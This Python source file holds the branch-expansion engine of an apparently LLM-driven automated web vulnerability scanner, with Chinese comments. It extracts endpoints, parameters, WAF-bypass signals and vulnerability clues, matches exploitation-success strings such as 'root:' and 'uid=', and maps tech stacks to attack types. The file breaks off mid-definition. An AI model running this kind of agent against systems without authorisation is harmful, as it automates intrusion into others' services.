"""
LATS 动态扩展引擎

实现发现驱动的搜索树动态增长:
- DiscoveryExtractor: 从 ReAct 执行结果中提取各类发现
- ExpansionEngine: 配额控制 + 分支创建 + Graveyard 复活

解决 v1 架构"搜索树静态化"的核心缺陷。
"""

import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from .search_tree import NodeStatus, SearchNode, SearchTree

logger = logging.getLogger(__name__)


class DiscoveryType(str, Enum):
    """发现类型枚举"""
    NEW_ENDPOINT = "new_endpoint"         # 发现新端点/URL
    NEW_PARAM = "new_param"               # 发现新参数名
    WAF_BYPASS_FOUND = "waf_bypass_found" # 发现 WAF 绕过技术
    TECH_DISCOVERY = "tech_discovery"     # 发现新技术栈信息
    AUTH_CONTEXT_CHANGE = "auth_context_change"  # 发现新认证上下文
    ERROR_LEAK = "error_leak"             # 发现错误信息泄露
    VULN_TYPE_CLUE = "vuln_type_clue"     # 响应特征暗示特定漏洞类型
    LLM_SUGGESTION = "llm_suggestion"     # LLM 建议的探索方向


@dataclass
class Discovery:
    """单条发现记录"""
    discovery_type: DiscoveryType
    source_node_id: str
    source_cycle: int
    data: dict = field(default_factory=dict)
    confidence: float = 0.5

    def __post_init__(self):
        """v6: 全局防御 — data 必须为 dict, 字符串自动包装"""
        if not isinstance(self.data, dict):
            self.data = {"raw": str(self.data)}


# ──── 扩展配额定义 ────

@dataclass
class ExpansionQuotas:
    """每种发现类型的扩展配额 (防分支爆炸)"""
    new_endpoint_per_cycle: int = 10      # v11: 每周期最多基于新端点创建 10 个分支 (曾为 3)
    new_endpoint_total: int = 80          # v11: 累计不超过 80 个 (曾为 20)
    new_param_per_endpoint: int = 5       # 每端点最多 5 个参数节点
    waf_bypass_assoc_nodes: int = 10      # v11: 从 5→10
    tech_discovery_new_types: int = 5     # v11: 从 3→5
    auth_context_endpoints: int = 20      # v11: 从 10→20
    vuln_type_clue_per_signal: int = 3    # v11: 从 1→3
    llm_suggestion_per_cycle: int = 3     # v11: 从 2→3
    global_max_nodes: int = 300           # v11: 从 200→300

    # 运行计数器 (每周期重置)
    cycle_new_endpoints: int = 0
    total_new_endpoints: int = 0
    params_per_endpoint: dict = field(default_factory=dict)
    waf_bypass_assoc: dict = field(default_factory=dict)
    tech_new_types: dict = field(default_factory=dict)
    auth_endpoints: int = 0
    cycle_llm_suggestions: int = 0

    def reset_cycle_counters(self) -> None:
        """重置每周期计数器"""
        self.cycle_new_endpoints = 0
        self.cycle_llm_suggestions = 0

    def can_create(self, discovery_type: DiscoveryType, search_tree: SearchTree,
                   extra: dict | None = None) -> bool:
        """检查是否还有该类发现的创建配额 (v11: 分级冷却)"""
        # 全局上限
        if len(search_tree.nodes) >= self.global_max_nodes:
            return False

        extra = extra or {}

        # v11: 分级冷却 — 按周期阶段调整单周期配额
        cycle = extra.get("cycle", 0) if extra else 0
        if cycle <= 5:
            effective_per_cycle = self.new_endpoint_per_cycle      # 全配额
        elif cycle <= 10:
            effective_per_cycle = max(2, self.new_endpoint_per_cycle // 2)  # 半配额
        else:
            effective_per_cycle = 2                                    # 最低配额

        if discovery_type == DiscoveryType.NEW_ENDPOINT:
            return (self.cycle_new_endpoints < effective_per_cycle and
                    self.total_new_endpoints < self.new_endpoint_total)

        elif discovery_type == DiscoveryType.NEW_PARAM:
            endpoint = extra.get("endpoint", "")
            count = self.params_per_endpoint.get(endpoint, 0)
            return count < self.new_param_per_endpoint

        elif discovery_type == DiscoveryType.WAF_BYPASS_FOUND:
            technique = extra.get("technique", "unknown")
            count = self.waf_bypass_assoc.get(technique, 0)
            return count < self.waf_bypass_assoc_nodes

        elif discovery_type == DiscoveryType.TECH_DISCOVERY:
            tech = extra.get("tech_name", "unknown")
            count = self.tech_new_types.get(tech, 0)
            return count < self.tech_discovery_new_types

        elif discovery_type == DiscoveryType.AUTH_CONTEXT_CHANGE:
            return self.auth_endpoints < self.auth_context_endpoints

        elif discovery_type == DiscoveryType.VULN_TYPE_CLUE:
            return True  # 很稀有, 不限配额

        elif discovery_type == DiscoveryType.LLM_SUGGESTION:
            return self.cycle_llm_suggestions < self.llm_suggestion_per_cycle

        return True

    def record_creation(self, discovery_type: DiscoveryType, extra: dict | None = None) -> None:
        """记录一次分支创建"""
        extra = extra or {}

        if discovery_type == DiscoveryType.NEW_ENDPOINT:
            self.cycle_new_endpoints += 1
            self.total_new_endpoints += 1
        elif discovery_type == DiscoveryType.NEW_PARAM:
            endpoint = extra.get("endpoint", "")
            self.params_per_endpoint[endpoint] = self.params_per_endpoint.get(endpoint, 0) + 1
        elif discovery_type == DiscoveryType.WAF_BYPASS_FOUND:
            technique = extra.get("technique", "unknown")
            self.waf_bypass_assoc[technique] = self.waf_bypass_assoc.get(technique, 0) + 1
        elif discovery_type == DiscoveryType.TECH_DISCOVERY:
            tech = extra.get("tech_name", "unknown")
            self.tech_new_types[tech] = self.tech_new_types.get(tech, 0) + 1
        elif discovery_type == DiscoveryType.AUTH_CONTEXT_CHANGE:
            self.auth_endpoints += 1
        elif discovery_type == DiscoveryType.LLM_SUGGESTION:
            self.cycle_llm_suggestions += 1


# ──── 发现提取器 ────

class DiscoveryExtractor:
    """
    从 ReAct 执行结果和探测结果中提取发现

    在 react_executor 的每个 ReAct Agent 循环结束后调用。
    """

    def extract_from_react_result(
        self,
        result: Any,  # ReactResult
        node: SearchNode,
        cycle: int,
    ) -> list[Discovery]:
        """
        从 ReAct 执行结果中提取所有发现

        Args:
            result: ReactResult (包含 steps + reward + status)
            node: 对应的搜索树节点
            cycle: 当前搜索周期

        Returns:
            发现列表
        """
        discoveries = []

        if result is None:
            return discoveries

        # 遍历 ReAct 步骤
        for step in getattr(result, 'steps', []):
            observation = getattr(step, 'observation', '') or ''
            action = getattr(step, 'action', '') or ''
            fact_list = getattr(step, 'new_facts', [])

            # 1. 错误信息泄露
            if self._is_error_leak(observation, action):
                discoveries.append(Discovery(
                    discovery_type=DiscoveryType.ERROR_LEAK,
                    source_node_id=node.id,
                    source_cycle=cycle,
                    data={"observation": observation[:200], "action": action},
                    confidence=0.7,
                ))

            # 2. WAF 绕过发现
            if self._is_waf_bypass(observation, action):
                discoveries.append(Discovery(
                    discovery_type=DiscoveryType.WAF_BYPASS_FOUND,
                    source_node_id=node.id,
                    source_cycle=cycle,
                    data={"observation": observation[:200], "action": action},
                    confidence=0.8,
                ))

            # 3. 技术栈发现
            tech_discoveries = self._extract_tech_discoveries(fact_list)
            discoveries.extend(tech_discoveries)

            # 4. 漏洞类型线索
            if self._is_vuln_clue(observation):
                discoveries.append(Discovery(
                    discovery_type=DiscoveryType.VULN_TYPE_CLUE,
                    source_node_id=node.id,
                    source_cycle=cycle,
                    data={"observation": observation[:200]},
                    confidence=0.5,
                ))

        # 5. 从 finding 中提取新端点信息
        # note: finding['evidence'] 始终为字符串(漏洞描述文本)，不是 dict，
        #       URL 只存在于 finding['url'] 中（部分 finding 类型无此字段）
        finding = getattr(result, 'finding', None) or {}
        if finding:
            url = finding.get('url', '')
            if url:
                discoveries.append(Discovery(
                    discovery_type=DiscoveryType.NEW_ENDPOINT,
                    source_node_id=node.id,
                    source_cycle=cycle,
                    data={"url": url, "source": "finding"},
                    confidence=0.6,
                ))

        # 6. v2-fix: 从 new_facts 中提取发现 (补充字符串匹配盲区)
        for fact in getattr(result, 'new_facts', []) or []:
            if not isinstance(fact, str):
                continue
            fact_lower = fact.lower()
            # v16: 扩展关键词覆盖 — URL/端点/参数/漏洞信号/技术栈/WAF
            if any(kw in fact_lower for kw in ("发现", "found", "端点", "endpoint", "链接", "link", "url", "api", "路径", "path")):
                discoveries.append(Discovery(discovery_type=DiscoveryType.NEW_ENDPOINT,
                    source_node_id=node.id, source_cycle=cycle,
                    data={"url": fact[:200], "source": "new_facts"}, confidence=0.4))
            if any(kw in fact_lower for kw in ("参数", "param", "注入点", "injection")):
                discoveries.append(Discovery(discovery_type=DiscoveryType.NEW_PARAM,
                    source_node_id=node.id, source_cycle=cycle,
                    data={"param_name": fact[:200], "endpoint": node.state.current_endpoint}, confidence=0.4))
            # v16: 漏洞信号/技术栈/WAF 检测
            if any(kw in fact_lower for kw in ("反射", "reflected", "payload", "确认", "confirmed")):
                discoveries.append(Discovery(discovery_type=DiscoveryType.VULN_TYPE_CLUE,
                    source_node_id=node.id, source_cycle=cycle,
                    data={"observation": fact[:200], "source": "new_facts"}, confidence=0.55))
            if any(kw in fact_lower for kw in ("server:", "x-powered-by", "framework:", "技术栈", "apache", "nginx", "php", "mysql")):
                discoveries.append(Discovery(discovery_type=DiscoveryType.TECH_DISCOVERY,
                    source_node_id=node.id, source_cycle=cycle,
                    data={"tech_name": fact[:100], "evidence": fact[:200]}, confidence=0.5))
            if any(kw in fact_lower for kw in ("waf", "过滤", "blocked", "allowed", "filter", "绕过", "bypass")):
                discoveries.append(Discovery(discovery_type=DiscoveryType.WAF_BYPASS_FOUND,
                    source_node_id=node.id, source_cycle=cycle,
                    data={"observation": fact[:200], "action": "from_new_facts"}, confidence=0.5))

        # 7. v2-fix: run_poc 结果特殊处理
        for step in getattr(result, 'steps', []):
            action = getattr(step, 'action', '') or ''
            observation = getattr(step, 'observation', '') or ''
            if action == 'run_poc' and observation:
                discoveries.extend(self._extract_from_poc(observation, node, cycle))

        return discoveries

    def _extract_from_poc(self, observation: str, node: SearchNode, cycle: int) -> list[Discovery]:
        """v2-fix: 从 run_poc 执行结果中提取发现"""
        discoveries = []
        obs_lower = observation.lower()
        poc_indicators = ["vulnerable", "exploited", "pwned", "200 ok", "success", "flag{",
                          "root:", "uid=", "admin", "password"]
        if any(ind in obs_lower for ind in poc_indicators):
            discoveries.append(Discovery(
                discovery_type=DiscoveryType.VULN_TYPE_CLUE,
                source_node_id=node.id,
                source_cycle=cycle,
                data={"observation": observation[:200], "source": "run_poc"},
                confidence=0.6,
            ))
        return discoveries

    def extract_from_tool_result(
        self,
        tool_name: str,
        tool_result: dict,
        node: SearchNode,
        cycle: int,
    ) -> list[Discovery]:
        """从工具执行结果中提取发现 (v2-fix: 类型防御)"""
        discoveries = []

        # v2-fix: tool_result 非 dict 防御
        if not isinstance(tool_result, dict):
            return discoveries
        if not tool_result or not tool_result.get("success"):
            return discoveries
        # v2-fix: tool_name 标准化
        tool_name = str(tool_name) if tool_name else ""

        # crawl_page / render_page / deep_crawl → 新端点
        if tool_name in ("crawl_page", "render_page", "deep_crawl", "browser_request"):
            urls = (tool_result.get("urls", []) or
                    tool_result.get("links", []) or [])
            for url_data in urls[:20]:  # v2-fix: 从 10 → 20
                if isinstance(url_data, dict):
                    url = url_data.get("url", "")
                elif isinstance(url_data, str):
                    url = url_data
                else:
                    continue
                if url and url.startswith("http"):
                    discoveries.append(Discovery(
                        discovery_type=DiscoveryType.NEW_ENDPOINT,
                        source_node_id=node.id,
                        source_cycle=cycle,
                        data={"url": url, "source": tool_name},
                        confidence=0.7,
                    ))
            # v2-fix: 从 deep_crawl 的 forms 和 parameters 中提取
            forms = tool_result.get("forms", []) or []
            for form in forms[:10]:
                if isinstance(form, dict):
                    action = form.get("action", "")
                    params = form.get("params", form.get("inputs", []))
                    if action:
                        discoveries.append(Discovery(
                            discovery_type=DiscoveryType.NEW_ENDPOINT,
                            source_node_id=node.id,
                            source_cycle=cycle,
                            data={"url": action, "source": f"{tool_name}_form"},
                            confidence=0.65,
                        ))
                    for p in (params if isinstance(params, list) else [])[:5]:
                        pname = p.get("name", "") if isinstance(p, dict) else str(p)
                        if pname:
                            discoveries.append(Discovery(
                                discovery_type=DiscoveryType.NEW_PARAM,
                                source_node_id=node.id,
                                source_cycle=cycle,
                                data={"param_name": pname, "endpoint": action or node.state.current_endpoint},
                                confidence=0.5,
                            ))
            parameters = tool_result.get("parameters", []) or []
            for p in parameters[:10]:
                if isinstance(p, dict) and p.get("name"):
                    discoveries.append(Discovery(
                        discovery_type=DiscoveryType.NEW_PARAM,
                        source_node_id=node.id,
                        source_cycle=cycle,
                        data={"param_name": p["name"], "endpoint": p.get("url", node.state.current_endpoint)},
                        confidence=0.55,
                    ))

        # discover_params → 新参数
        if tool_name == "discover_params":
            params = tool_result.get("found_params", []) or []
            for p in params[:10]:
                discoveries.append(Discovery(
                    discovery_type=DiscoveryType.NEW_PARAM,
                    source_node_id=node.id,
                    source_cycle=cycle,
                    data={
                        "param_name": p if isinstance(p, str) else p.get("name", ""),
                        "endpoint": node.state.current_endpoint,
                    },
                    confidence=0.6,
                ))

        # probe_filter → WAF 规则发现
        if tool_name == "probe_filter":
            filter_rules = tool_result.get("filter_rules", {}) or {}
            if filter_rules.get("blocked") or filter_rules.get("allowed"):
                discoveries.append(Discovery(
                    discovery_type=DiscoveryType.WAF_BYPASS_FOUND,
                    source_node_id=node.id,
                    source_cycle=cycle,
                    data={"filter_rules": filter_rules},
                    confidence=0.8,
                ))

        return discoveries

    # ──── 内部检测方法 ────

    @staticmethod
    def _is_error_leak(observation: str, action: str) -> bool:
        """检测是否发现错误信息泄露"""
        error_indicators = [
            "stack trace", "traceback", "exception", "error_message_leaked",
            "sql syntax", "unclosed quotation", "ORA-", "PostgreSQL",
            "DEBUG=True", "SECRET_KEY",
        ]
        obs_lower = observation.lower()
        return any(ind.lower() in obs_lower for ind in error_indicators)

    @staticmethod
    def _is_waf_bypass(observation: str, action: str) -> bool:
        """检测是否成功绕过 WAF"""
        if action not in ("mutate_payload", "probe_filter", "inject_payload"):
            return False
        obs_lower = observation.lower()
        success_indicators = ["bypass", "mutation success", "payload reflected",
                              "not blocked", "allowed", "waf bypass"]
        return any(ind in obs_lower for ind in success_indicators)

    def _extract_tech_discoveries(self, new_facts: list) -> list[Discovery]:
        """从 new_facts 中提取技术栈发现"""
        discoveries = []
        tech_keywords = {
            "Laravel": "laravel",
            "Django": "django",
            "Spring": "spring",
            "Express": "express",
            "ASP.NET": "asp.net",
            "Flask": "flask",
            "Rails": "rails",
            "PHP": "php",
            "Node.js": "node",
            "Java": "java",
            "Nginx": "nginx",
            "Apache": "apache",
        }
        for fact in new_facts:
            fact_lower = fact.lower() if isinstance(fact, str) else ""
            for tech_name, keyword in tech_keywords.items():
                if keyword in fact_lower and "Framework:" in fact:
                    discoveries.append(Discovery(
                        discovery_type=DiscoveryType.TECH_DISCOVERY,
                        source_node_id="system",
                        source_cycle=0,
                        data={"tech_name": tech_name, "evidence": fact},
                        confidence=0.7,
                    ))
        return discoveries

    @staticmethod
    def _is_vuln_clue(observation: str) -> bool:
        """检测是否暗示特定漏洞类型"""
        vuln_clue_map = {
            "time_anomaly": "sql_injection",
            "reflected": "xss",
            "redirect": "open_redirect",
            "internal address": "ssrf",
            "file content": "lfi",
            "config leak": "info_disclosure",
        }
        obs_lower = observation.lower()
        for clue, vuln_type in vuln_clue_map.items():
            if clue in obs_lower:
                return True
        return False


# ──── 扩展引擎 ────

class ExpansionEngine:
    """
    动态扩展引擎

    职责:
    1. 接收 Discovery 列表
    2. 在配额内创建新的搜索树分支
    3. 管理 Graveyard 复活
    """

    def __init__(self):
        self.quotas = ExpansionQuotas()
        self.discovery_extractor = DiscoveryExtractor()
        self._expansion_history: list[dict] = []

    async def expand(
        self,
        tree: SearchTree,
        discoveries: list[Discovery],
        current_cycle: int,
        base_url: str = "",
        knowledge: Any = None,  # Phase 2: SharedKnowledge
        llm: Any = None,  # P2-3: LLM 客户端, 用于 LLM 辅助扩展
        task_id: str = "",  # P2-3: 任务 ID
    ) -> dict:
        """
        基于发现执行动态扩展 (P2-3: 增加 LLM 辅助扩展)

        Args:
            tree: 搜索树
            discoveries: 本轮所有发现
            current_cycle: 当前周期
            base_url: 目标基础 URL
            knowledge: SharedKnowledge 引用 (Phase 2)
            llm: LLM 客户端 (P2-3: 用于生成扩展方向)
            task_id: 任务 ID

        Returns:
            {
                "new_branches": int,
                "resurrected": int,
                "discoveries_processed": int,
                "by_type": {DiscoveryType: count},
            }
        """
        self.quotas.reset_cycle_counters()
        new_branches = 0
        by_type: dict[str, int] = {}

        root = tree.get_root()
        if root is None:
            return {"new_branches": 0, "resurrected": 0, "discoveries_processed": 0, "by_type": {}}

        for discovery in discoveries:
            if not self.quotas.can_create(discovery.discovery_type, tree, extra={"cycle": current_cycle}):
                continue

            # v15: source_node 作为 parent — 新分支挂载到产生发现的节点下 (depth+1)
            source_node = tree.get_node(discovery.source_node_id)
            parent = source_node if source_node else root
            created_nodes = self._create_branches_for_discovery(
                tree, parent, discovery, current_cycle, base_url
            )

            if created_nodes:
                self.quotas.record_creation(discovery.discovery_type,
                                            self._get_quota_extra(discovery))
                new_branches += len(created_nodes)
                type_key = discovery.discovery_type.value
                by_type[type_key] = by_type.get(type_key, 0) + len(created_nodes)

        # P2-3: LLM 辅助扩展 — 利用 LLM 推理生成额外扩展方向
        if llm is not None and discoveries:
            llm_branches = await self._expand_with_llm(
                tree, discoveries, current_cycle, base_url, llm, task_id,
            )
            if llm_branches:
                new_branches += llm_branches
                by_type["llm_suggestion"] = by_type.get("llm_suggestion", 0) + llm_branches

        # Graveyard 复活检查
        resurrected = 0
        if knowledge is not None and hasattr(knowledge, 'get_recent_changes'):
            changes = knowledge.get_recent_changes()
            if changes:
                revived = tree.resurrect_from_graveyard(changes)
                resurrected = len(revived)

        # 记录扩展历史
        self._expansion_history.append({
            "cycle": current_cycle,
            "new_branches": new_branches,
            "resurrected": resurrected,
            "discoveries": len(discoveries),
            "by_type": dict(by_type),
            "total_nodes": len(tree.nodes),
            "graveyard_size": len(tree.graveyard),
        })

        logger.info(
            "扩展引擎: cycle=%d, new=%d, resurrected=%d, discoveries=%d, total_nodes=%d",
            current_cycle, new_branches, resurrected, len(discoveries), len(tree.nodes),
        )

        return {
            "new_branches": new_branches,
            "resurrected": resurrected,
            "discoveries_processed": len(discoveries),
            "by_type": by_type,
        }

    async def _expand_with_llm(
        self,
        tree: SearchTree,
        discoveries: list[Discovery],
        current_cycle: int,
        base_url: str,
        llm: Any,
        task_id: str = "",
    ) -> int:
        """P2-3: 使用 LLM 生成扩展方向"""
        try:
            import json as _json
            from .prompts import EXPAND_PROMPT_TEMPLATE

            root = tree.get_root()
            if root is None:
                return 0

            # 构建上下文: 收集最近的发现摘要
            discovery_summaries = []
            for d in discoveries[:10]:
                discovery_summaries.append(f"{d.discovery_type.value}: {str(d.data)[:100]}")

            # 选择一个代表性节点作为上下文
            recent_nodes = [n for n in tree.nodes.values() if n.visit_count > 0][-3:]
            if not recent_nodes:
                return 0

            node = recent_nodes[-1]
            node_state = {
                "target_url": base_url or node.state.target_url,
                "current_endpoint": node.state.current_endpoint,
                "current_param": node.state.current_param or "N/A",
                "vuln_type": node.state.vuln_type,
                "known_facts": node.state.known_facts[-5:],
                "tried_actions": node.state.tried_actions[-5:],
            }
            last_obs = node.state.reasoning_chain[-1].observation if node.state.reasoning_chain else ""

            prompt = EXPAND_PROMPT_TEMPLATE.format(
                target_url=node_state["target_url"],
                endpoint=node_state["current_endpoint"],
                param=node_state["current_param"],
                vuln_type=node_state["vuln_type"],
                known_facts=node_state["known_facts"],
                tried_actions=node_state["tried_actions"],
                last_observation=last_obs or "无",
            )

            messages = [
                {"role": "system", "content": "你是漏洞搜索树的扩展器。生成具体的、可执行的下一步动作方向。"},
                {"role": "user", "content": prompt},
            ]

            response_text = await llm.call(
                agent="expand", messages=messages, task_id=task_id,
            )

            # 解析 LLM 响应为 JSON 数组
            try:
                start = response_text.find("[")
                end = response_text.rfind("]") + 1
                if start < 0 or end <= start:
                    return 0
                suggestions = _json.loads(response_text[start:end])
            except _json.JSONDecodeError:
                logger.warning("LLM 扩展响应解析失败")
                return 0

            if not isinstance(suggestions, list):
                return 0

            created_count = 0
            for suggestion in suggestions[:3]:
                if not isinstance(suggestion, dict):
                    continue
                if not self.quotas.can_create(
                    DiscoveryType.LLM_SUGGESTION, tree,
                    extra={"cycle": current_cycle},
                ):
                    break

                action = suggestion.get("action", "explore")
                params = suggestion.get("params", {})
                value = float(suggestion.get("estimated_value", 0.4))
                value = max(0.1, min(1.0, value))

                # 从建议中提取端点/参数/漏洞类型
                ep = params.get("endpoint", node.state.current_endpoint)
                param = params.get("param", node.state.current_param)
                vt = params.get("vuln_type", node.state.vuln_type)

                child = tree.create_child_node(
                    parent=node,
                    action=action,
                    action_params=params,
                    vuln_type=vt,
                    endpoint=ep,
                    param=param,
                    value_estimate=value,
                    created_at_cycle=current_cycle,
                )
                child.status = NodeStatus.SEED
                created_count += 1
                self.quotas.record_creation(DiscoveryType.LLM_SUGGESTION)

            if created_count:
                logger.info("LLM 扩展: 生成了 %d 个新分支", created_count)
            return created_count

        except Exception as e:
            logger.warning("LLM 扩展失败 (非致命): %s", str(e))
            return 0

    def _create_branches_for_discovery(
        self,
        tree: SearchTree,
        parent: SearchNode,
        discovery: Discovery,
        cycle: int,
        base_url: str,
    ) -> list[SearchNode]:
        """为单个发现创建搜索分支 (v13: 单个发现失败不影响其他)"""
        created = []
        try:
            if discovery.discovery_type == DiscoveryType.NEW_ENDPOINT:
                created.extend(self._create_endpoint_branches(tree, parent, discovery, cycle, base_url))
            elif discovery.discovery_type == DiscoveryType.NEW_PARAM:
                created.extend(self._create_param_branches(tree, parent, discovery, cycle))
            elif discovery.discovery_type == DiscoveryType.WAF_BYPASS_FOUND:
                created.extend(self._create_bypass_branches(tree, parent, discovery, cycle))
            elif discovery.discovery_type == DiscoveryType.TECH_DISCOVERY:
                created.extend(self._create_tech_branches(tree, parent, discovery, cycle))
            elif discovery.discovery_type == DiscoveryType.VULN_TYPE_CLUE:
                created.extend(self._create_vuln_clue_branch(tree, parent, discovery, cycle))
            elif discovery.discovery_type == DiscoveryType.AUTH_CONTEXT_CHANGE:
                created.extend(self._create_auth_branches(tree, parent, discovery, cycle))
        except Exception as e:
            logger.warning("_create_branches_for_discovery failed for %s: %s",
                          discovery.discovery_type.value, str(e))
        return created

    def _create_endpoint_branches(
        self, tree: SearchTree, parent: SearchNode,
        discovery: Discovery, cycle: int, base_url: str,
    ) -> list[SearchNode]:
        """为新端点创建探索分支"""
        created = []
        url = discovery.data.get("url", "")
        if not url:
            return created

        # P1-1: 验证 URL 是有效的路径（以 / 开头或包含域名）
        # 如果 URL 无效（如包含非 URL 文本），跳过创建
        if not (url.startswith("/") or "http" in url):
            logger.warning("跳过无效的端点 URL: %s", url[:100])
            return created

        from urllib.parse import urlparse, parse_qs

        path = url
        params = []
        try:
            parsed = urlparse(url)
            path = parsed.path or url
            if parsed.query:
                qs = parse_qs(parsed.query)
                params = list(qs.keys())
        except Exception:
            pass

        from .reward import infer_vuln_types

        for vuln_type in infer_vuln_types("", endpoint=path)[:3]:
            child = tree.create_child_node(
                parent=parent,
                action="explore",
                action_params={"endpoint": path, "vuln_type": vuln_type},
                vuln_type=vuln_type,
                endpoint=path,
                param=params[0] if params else None,
                value_estimate=0.4,  # 动态创建的节点先验保守一些
                created_at_cycle=cycle,
            )
            child.status = NodeStatus.SEED
            created.append(child)

        return created

    def _create_param_branches(
        self, tree: SearchTree, parent: SearchNode,
        discovery: Discovery, cycle: int,
    ) -> list[SearchNode]:
        """为新参数创建注入测试分支 (v5: 独立推断 vuln_type, 不继承父节点)"""
        created = []
        param_name = discovery.data.get("param_name", "")
        endpoint = discovery.data.get("endpoint", "")

        # P1-1: 验证 endpoint 是有效的 URL 路径（以 / 开头或包含域名）
        # 如果 endpoint 无效，使用父节点的 current_endpoint
        if not endpoint or not (endpoint.startswith("/") or "http" in endpoint):
            endpoint = parent.state.current_endpoint or "/"

        if not param_name:
            return created

        from .reward import infer_vuln_types

        # v5: 独立推断, 不继承父节点的 auth_bypass
        vuln_types = infer_vuln_types(param_name, endpoint=endpoint)
        # v5: 如果没有推断出类型, 默认使用 sql_injection + xss + idor
        if not vuln_types or vuln_types == ["xss", "sql_injection"]:
            vuln_types = ["sql_injection", "xss", "idor", "auth_bypass"]

        # v20-fix: 从 endpoint 路径获取理应存在的漏洞类型, 避免为 RCE 端点创建 SQLi 分支
        try:
            from app.agents.lats.graph import _infer_vuln_from_path
            path_inferred = _infer_vuln_from_path(endpoint) if endpoint else []
        except ImportError:
            path_inferred = []
        if path_inferred and path_inferred != ["info_disclosure", "auth_bypass"]:
            effective = [vt for vt in vuln_types if vt in path_inferred]
            if effective:
                vuln_types = effective
            else:
                vuln_types = vuln_types[:1]  # 路径不匹配→保守只创建1个

        for vuln_type in vuln_types[:4]:
            child = tree.create_child_node(
                parent=parent,
                action="explore",
                action_params={"endpoint": endpoint, "param": param_name, "vuln_type": vuln_type},
                vuln_type=vuln_type,
                endpoint=endpoint,
                param=param_name,
                value_estimate=0.5,  # v5: 参数分支价值稍高
                created_at_cycle=cycle,
            )
            child.status = NodeStatus.SEED
            created.append(child)

        return created

    def _create_bypass_branches(
        self, tree: SearchTree, parent: SearchNode,
        discovery: Discovery, cycle: int,
    ) -> list[SearchNode]:
        """基于 WAF 绕过发现创建关联分支"""
        created = []
        technique_data = discovery.data.get("filter_rules", {}) or discovery.data

        # 为所有同端点的不同 vuln_type 创建使用绕过技术的兄弟节点
        source_node = tree.get_node(discovery.source_node_id)
        if source_node is None:
            return created

        endpoint = source_node.state.current_endpoint
        current_param = source_node.state.current_param

        from .reward import infer_vuln_types

        other_types = [vt for vt in infer_vuln_types(current_param or "", endpoint=endpoint)
                       if vt != source_node.state.vuln_type]
        for vuln_type in other_types[:2]:
            child = tree.create_child_node(
                parent=parent,
                action="explore_with_bypass",
                action_params={
                    "endpoint": endpoint,
                    "param": current_param,
                    "vuln_type": vuln_type,
                    "bypass": technique_data,
                },
                vuln_type=vuln_type,
                endpoint=endpoint,
                param=current_param,
                value_estimate=source_node.value_estimate * 0.8,
                created_at_cycle=cycle,
            )
            child.status = NodeStatus.SEED
            created.append(child)

        return created

    def _create_tech_branches(
        self, tree: SearchTree, parent: SearchNode,
        discovery: Discovery, cycle: int,
    ) -> list[SearchNode]:
        """基于技术栈发现创建补充漏洞类型分支"""
        created = []
        tech_name = discovery.data.get("tech_name", "")

        tech_vuln_map: dict[str, list[str]] = {
            "Laravel": ["ssti", "sql_injection", "auth_bypass"],
            "Django": ["ssti", "idor", "sql_injection"],
            "Spring": ["rce", "ssrf", "idor"],
            "Express": ["ssrf", "idor", "nosql_injection"],
            "Flask": ["ssti", "ssrf", "info_disclosure"],
            "PHP": ["sql_injection", "lfi", "rce"],
            "Java": ["rce", "ssrf", "xxe"],
            "ASP.NET": ["sqli", "rce", "idor"],
        }

        vuln_types = tech_vuln_map.get(tech_name, ["sql_injection", "xss", "info_disclosure"])

        for vt in vuln_types[:2]:
            child = tree.create_child_node(
                parent=parent,
                action="explore_tech",
                action_params={"vuln_type": vt, "tech": tech_name},
                vuln_type=vt,
                endpoint=parent.state.current_endpoint,
                param=parent.state.current_param,
                value_estimate=0.45,
                created_at_cycle=cycle,
            )
            child.status = NodeStatus.SEED
            created.append(child)

        return created

    def _create_vuln_clue_branch(
        self, tree: SearchTree, parent: SearchNode,
        discovery: Discovery, cycle: int,
    ) -> list[SearchNode]:
        """基于漏洞线索创建深度探测节点"""
        created = []
        observation = discovery.data.get("observation", "").lower()

        clue_vuln_map = {
            "time_anomaly": "sql_injection",
            "reflected": "xss",
            "redirect": "open_redirect",
            "internal address": "ssrf",
            "file content": "lfi",
            "config leak": "info_disclosure",
            "expression result": "ssti",
            "command output": "rce",
        }

        for clue, vuln_type in clue_vuln_map.items():
            if clue in observation:
                source_node = tree.get_node(discovery.source_node_id)
                if source_node and vuln_type != source_node.state.vuln_type:
                    child = tree.create_child_node(
                        parent=parent,
                        action="explore_clue",
                        action_params={
                            "endpoint": source_node.state.current_endpoint,
                            "param": source_node.state.current_param,
                            "vuln_type": vuln_type,
                            "clue": clue,
                        },
                        vuln_type=vuln_type,
                        endpoint=source_node.state.current_endpoint,
                        param=source_node.state.current_param,
                        value_estimate=0.55,
                        created_at_cycle=cycle,
                    )
                    child.status = NodeStatus.SEED
                    created.append(child)
                    break  # 每个线索只创建 1 个分支

        return created

    def _create_auth_branches(
        self, tree: SearchTree, parent: SearchNode,
        discovery: Discovery, cycle: int,
    ) -> list[SearchNode]:
        """基于新认证上下文创建越权测试分支"""
        created = []
        # 为所有已知端点创建带新 auth context 的 auth_bypass 测试
        known_endpoints = set()
        for node in tree.nodes.values():
            ep = node.state.current_endpoint
            if ep and ep != "/" and not ep.startswith("http://127.0.0.1"):
                known_endpoints.add(ep)

        for ep in list(known_endpoints)[:3]:
            child = tree.create_child_node(
                parent=parent,
                action="test_auth_bypass",
                action_params={"endpoint": ep, "vuln_type": "auth_bypass"},
                vuln_type="auth_bypass",
                endpoint=ep,
                param=None,
                value_estimate=0.5,
                created_at_cycle=cycle,
            )
            child.status = NodeStatus.SEED
            created.append(child)

        return created

    def _get_quota_extra(self, discovery: Discovery) -> dict:
        """从发现中提取配额追踪所需的额外信息 (v13: filter_rules 防御)"""
        # v13: filter_rules 可能为字符串, 安全提取
        filter_rules = discovery.data.get("filter_rules", {})
        if not isinstance(filter_rules, dict):
            filter_rules = {}
        return {
            "endpoint": discovery.data.get("endpoint", discovery.data.get("url", "")),
            "technique": discovery.data.get("technique", filter_rules.get("bypass", "unknown")),
            "tech_name": discovery.data.get("tech_name", "unknown"),
        }

    def expand_node_for_depth(
        self, tree: SearchTree, node: SearchNode, current_cycle: int,
    ) -> list[SearchNode]:
        """v15: 为 NEEDS_EXPANSION 节点创建 depth+1 子节点 (不同探索方向)"""
        created = []
        facts = node.state.known_facts[-5:] if node.state.known_facts else []
        tried = node.state.tried_actions[-5:] if node.state.tried_actions else []
        parent = node

        # 基于节点状态生成子方向
        vuln = node.state.vuln_type
        ep = node.state.current_endpoint
        param = node.state.current_param

        # 方向 1: 不同 payload (尝试 UNION / stacked / 报错注入等高级技术)
        alt_payloads = {
